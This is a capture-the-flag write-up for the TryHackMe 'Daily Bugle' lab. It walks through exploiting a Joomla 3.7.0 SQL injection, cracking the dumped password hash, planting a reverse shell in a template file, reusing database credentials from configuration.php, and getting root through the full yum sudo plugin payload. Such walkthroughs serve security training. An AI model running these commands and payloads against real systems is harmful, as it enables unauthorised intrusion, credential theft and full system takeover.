# Daily Bugle - Tryhackme

<img width="722" height="166" alt="Image" src="https://github.com/user-attachments/assets/c5d47337-5206-4737-a93c-00a392af50ad" />

This room demonstrates how SQL injection in a Joomla CMS can be exploited to compromise user accounts, crack password hashes, and escalate privileges through misconfigured system utilities.

## INFO'S
* Difficulty: Hard
* Operating System : Linux
* Attack Type : Web application exploitation (SQLi) + credential compromise + privilege escalation.

## Enumeration
### Nmap Scan
```
Nmap scan report for 10.66.183.12
Host is up (0.23s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-title: Home
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)

```
The Nmap Scan shows the ports are opened are ssh(22) , http(80) , mysql(3306).

## Web Enumeration (PORT 80)

<img width="1680" height="972" alt="Image" src="https://github.com/user-attachments/assets/24e9320b-948f-4cca-a056-5f1fe0406c75" />

Question 1. Access the web server, who robbed the bank?

Answer : ```spiderman```

Explore The website source code and functionality were reviewed to understand the application workflow, followed by directory enumeration.

## Gobuster Scan

```
Command : gobuster dir -u http://<ip_address>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/README.txt           (Status: 200) [Size: 40] [--> http://10.66.183.12/README.txt/]
/images               (Status: 301) [Size: 235] [--> http://10.66.183.12/images/]
/media                (Status: 301) [Size: 234] [--> http://10.66.183.12/media/]
/templates            (Status: 301) [Size: 238] [--> http://10.66.183.12/templates/]
/modules              (Status: 301) [Size: 236] [--> http://10.66.183.12/modules/]
/bin                  (Status: 301) [Size: 232] [--> http://10.66.183.12/bin/]
/plugins              (Status: 301) [Size: 236] [--> http://10.66.183.12/plugins/]
/includes             (Status: 301) [Size: 237] [--> http://10.66.183.12/includes/]
/language             (Status: 301) [Size: 237] [--> http://10.66.183.12/language/]
/components           (Status: 301) [Size: 239] [--> http://10.66.183.12/components/]
/cache                (Status: 301) [Size: 234] [--> http://10.66.183.12/cache/]
/libraries            (Status: 301) [Size: 238] [--> http://10.66.183.12/libraries/]
/tmp                  (Status: 301) [Size: 232] [--> http://10.66.183.12/tmp/]
/layouts              (Status: 301) [Size: 236] [--> http://10.66.183.12/layouts/]
/administrator        (Status: 301) [Size: 242] [--> http://10.66.183.12/administrator/]
/cli                  (Status: 301) [Size: 232] [--> http://10.66.183.12/cli/]
Progress: 87662 / 87662 (100.00%)
===============================================================
Finished
===============================================================

```
Intresting Directory ```/README.txt``` has been found.
```
1- What is this?
        * This is a Joomla! installation/upgrade package to version 3.x
        * Joomla! Official site: https://www.joomla.org
        * Joomla! 3.7 version history - https://docs.joomla.org/Joomla_3.7_version_history
        * Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/master

2- What is Joomla?
        * Joomla! is a Content Management System (CMS) which enables you to build Web sites and powerful online applications.
        * It's a free and Open Source software, distributed under the GNU General Public License version 2 or later.
        * This is a simple and powerful web server application and it requires a server with PHP and either MySQL, PostgreSQL or SQL Server to run.
        You can find full technical requirements here: https://downloads.joomla.org/technical-requirements.

3- Is Joomla! for you?
        * Joomla! is the right solution for most content web projects: https://docs.joomla.org/Portal:Learn_More
        * See Joomla's core features - https://www.joomla.org/core-features.html
        * Try out our online demo: https://demo.joomla.org/

4- How to find a Joomla! translation?
        * Repository of accredited language packs: https://community.joomla.org/translations.html
        * You can also add languages directly to your website via your Joomla! administration panel: https://docs.joomla.org/J3.x:Setup_a_Multilingual_Site/Installing_New_Language
        * Learn how to setup a Multilingual Joomla! Site: https://docs.joomla.org/J3.x:Setup_a_Multilingual_Site

5- Learn Joomla!
        * Read Getting Started with Joomla to find out the basics: https://docs.joomla.org/J3.x:Getting_Started_with_Joomla!
        * Before installing, read the beginners guide: https://docs.joomla.org/Portal:Beginners

  ...........
```
Question 2. What is the Joomla version?

Answer : ```3.7.0```

The readme.txt has the version ```Joomla! 3.7 version```


Another Interesting Directory ```/administrator``` has been found .

<img width="1680" height="976" alt="Image" src="https://github.com/user-attachments/assets/2343e3e1-67b4-4a2f-847e-064c9c157e89" />

“Since Joomla CMS version 3.7.0 was identified, known public exploits were researched. as we find the exploit in the [ExploitDB](https://www.exploit-db.com/exploits/42033)
but author what us to try another method of python script so after a long search finally found the exploit of it in the github (https://github.com/stefanlucas/Exploit-Joomla/blob/master/joomblah.py) Thanks @stefanlucas

joomblah exploit was used to validate the SQL injection vulnerability 

```
python3 joomblah.py http://<ip_addresss>

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
                                               
```
In the Sql database we got the Credentials from the Table of the user ```jonah``` and the password hash of it .

Save the hash and use the ```John the Ripper``` tool for brute force attack

```
john --wordlist=/usr/share/wordlists/rockyou.txt <hash_file>

Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spiderman123     (?)     
1g 0:00:07:47 DONE (2026-01-02 20:12) 0.002138g/s 100.1p/s 100.1c/s 100.1C/s thelma1..speciala
Session completed. 
```

the Password wasa Cracked ```jonah``` : ```spiderman123```

Question 3. What is Jonah's cracked password?

Answer : ```spiderman123```

## Exploitation

Use the Credentials to Login the joomala login page 

<img width="1680" height="973" alt="Image" src="https://github.com/user-attachments/assets/5f7a932d-d5d3-4539-9e49-9e8666d0ee47" />


We get in to the Dashboard its the control panel of  Administrator(Jonah) now we have to get the Web shell so look for the files that can modify it with the reverse shell payload . Go to the Templates menu


<img width="1680" height="973" alt="Image" src="https://github.com/user-attachments/assets/adf9ced2-549c-49c9-9a0e-004f32542e72" />


Select the template of it i selected the protostar template because its runs as the default in it 


<img width="1680" height="976" alt="Image" src="https://github.com/user-attachments/assets/d41ad93c-c663-4724-a3c2-95b6da81e50e" />


Now we modify the file error.php with the Reverse shell payload [REVSHELL](https://www.revshells.com/) on the terminal start the netcat listener ```nc -lnvp 9001```
and save the file then Trigger the file to get the Shell.



<img width="1680" height="134" alt="Image" src="https://github.com/user-attachments/assets/a19381ce-b2c8-47ba-8383-baabd59447f4" />

Got the WEB Shell ✨

```

nc -lnvp 9001   
listening on [any] 9001 ...
connect to [192.168.150.101] from (UNKNOWN) [10.66.183.12] 39420
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 09:50:13 up 36 min,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ whoami
whoami
apache
sh-4.2$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
sh: python3: command not found
```
We got the Apache Web shell and we don't have the python in this system so we cannot use the pty to spawn the shell
```
sh-4.2$ cd /home
cd /home
sh-4.2$ ls
ls
jjameson
sh-4.2$ cd jjameson
cd jjameson
sh: cd: jjameson: Permission denied
```
we see the directory jjameson but we do not have the permission for accessing that folder so we have to escalute on the CMS service we have the configuration file that have the password for it . if there any chance the user reuses the password we can take over it ...
```
sh-4.2$ cd /var/www/html
cd /var/www/html
sh-4.2$ ls -al
ls -al
total 64
drwxr-xr-x. 17 apache apache  4096 Dec 14  2019 .
drwxr-xr-x.  4 root   root      33 Dec 14  2019 ..
-rwxr-xr-x.  1 apache apache 18092 Apr 25  2017 LICENSE.txt
-rwxr-xr-x.  1 apache apache  4494 Apr 25  2017 README.txt
drwxr-xr-x. 11 apache apache   159 Apr 25  2017 administrator
drwxr-xr-x.  2 apache apache    44 Apr 25  2017 bin
drwxr-xr-x.  2 apache apache    24 Apr 25  2017 cache
drwxr-xr-x.  2 apache apache   119 Apr 25  2017 cli
drwxr-xr-x. 19 apache apache  4096 Apr 25  2017 components
-rw-r--r--   1 apache apache  1982 Dec 14  2019 configuration.php
-rwxr-xr-x.  1 apache apache  3005 Apr 25  2017 htaccess.txt
drwxr-xr-x.  5 apache apache   164 Dec 15  2019 images
drwxr-xr-x.  2 apache apache    64 Apr 25  2017 includes
-rwxr-xr-x.  1 apache apache  1420 Apr 25  2017 index.php
drwxr-xr-x.  4 apache apache    54 Apr 25  2017 language
drwxr-xr-x.  5 apache apache    70 Apr 25  2017 layouts
drwxr-xr-x. 11 apache apache   255 Apr 25  2017 libraries
drwxr-xr-x. 26 apache apache  4096 Apr 25  2017 media
drwxr-xr-x. 27 apache apache  4096 Apr 25  2017 modules
drwxr-xr-x. 16 apache apache   250 Apr 25  2017 plugins
-rwxr-xr-x.  1 apache apache   836 Apr 25  2017 robots.txt
drwxr-xr-x.  5 apache apache    68 Dec 15  2019 templates
drwxr-xr-x.  2 apache apache    24 Dec 15  2019 tmp
-rwxr-xr-x.  1 apache apache  1690 Apr 25  2017 web.config.txt
sh-4.2$ cat configuration.php
cat configuration.php
<?php
class JConfig {
        public $offline = '0';
        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
        public $display_offline_message = '1';
        public $offline_image = '';
        public $sitename = 'The Daily Bugle';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = '20';
        public $access = '1';
        public $debug = '0';
        public $debug_lang = '0';
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'root';
        public $password = 'nv5#############';
        public $db = 'joomla';
        public $dbprefix = 'fb9j5_';
        public $live_site = '';
        public $secret = 'UAMBRWzHO3oFPmVC';
       ...........
}sh-4.2$ su root
su root
Password: nv5#############
su: Authentication failure
sh-4.2$ su jjameson
su jjameson
Password: nv5#############
```
We got the jjameson User Shell This confirmed credential reuse between the Joomla database and system users.
```
sh-4.2$ cd /home
ls
jjameson
sh-4.2$ cd jjameson
sh-4.2$ ls
user.txt
sh-4.2$ cat user.txt
27a#############################
```
We Got the User.txt ✨

After the Web shell escalute the permissions to the User Shell jjameson . Now We do the Privilege escalation to Root access 
## Privilege Escalation

```
sh-4.2$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```
The command ```sudo -l``` list the service which have the root access to excute with this we use the [GFTOBin](https://gtfobins.github.io/) website and search for the ```yum``` and get the payload to get the root shell 

Execute the payload to get the local user to root access shell
```
sh-4.2$ TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y
sh-4.2# whoami
root
sh-4.2# cd /root
ls
anaconda-ks.cfg
root.txt
sh-4.2# cat root.txt
eec#############################
```
After We got the Root Access and Root.txt Successfully 🔥💥

<img width="900" height="338" alt="Image" src="https://github.com/user-attachments/assets/58ac9c48-c459-45be-876a-3b4ef8c019a5" />



